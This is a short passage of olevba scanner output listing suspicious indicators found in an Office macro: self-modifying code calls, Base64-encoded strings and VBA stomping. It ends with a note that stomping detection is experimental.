|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

